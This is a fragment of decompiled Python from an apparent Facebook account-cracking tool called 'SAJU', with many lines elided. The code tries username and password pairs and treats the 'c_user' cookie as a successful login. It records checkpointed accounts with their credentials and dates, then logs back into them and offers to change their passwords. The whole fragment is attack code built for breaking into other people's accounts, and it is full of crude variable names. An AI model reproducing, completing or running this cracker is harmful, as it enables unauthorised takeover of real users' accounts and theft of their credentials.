...
# Time Succes decompile : 2022-09-26 18:52:56.190199
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}SAJU123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[SAJU-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[SAJU-CP] ", ""), titid[1])
...
class __chigoue__:
 ...
 #PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[SAJU]","\x1b[1;92m[SAJU]","\x1b[1;92m[SAJU]","\x1b[1;92m[SAJU]","\x1b[1;92m[SAJU]","\x1b[1;92m[SAJU]","\x1b[1;92m[SAJU]"])
               ...
               # ua2 = random.choice(agen2)
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[SAJU-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
